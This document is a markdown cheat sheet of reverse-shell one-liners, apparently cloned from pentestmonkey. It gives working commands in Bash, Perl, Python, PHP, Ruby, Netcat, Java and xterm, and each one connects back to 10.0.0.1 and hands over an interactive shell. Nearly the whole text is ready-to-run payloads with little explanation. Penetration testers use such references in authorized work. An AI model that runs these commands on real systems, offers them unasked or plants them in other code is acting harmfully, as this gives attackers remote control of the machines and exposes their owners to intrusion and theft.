# Reverse-shells cheat sheet
(Cloning from https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Unix-like
Note: the examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.

### Bash
Some versions of bash can send you a reverse shell:

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
### PERL

    perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'


### Python

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
### PHP
This code assumes that the TCP connection uses file descriptor 3 (if a more complete shell is needed, check the php-reverse-shell in this repo):

    php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

### Ruby
    
    ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

### Netcat
Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

    nc -e /bin/sh 10.0.0.1 1234
If you have the wrong version of netcat installed, Jeff Price points out here that you might still be able to get your reverse shell back like this:

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

### Java

    r = Runtime.getRuntime()
    p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
    p.waitFor()

### xterm
One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

    xterm -display 10.0.0.1:1

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

    Xnest :1

You’ll need to authorise the target to connect to you (command also run on your host):

    xhost +targetip
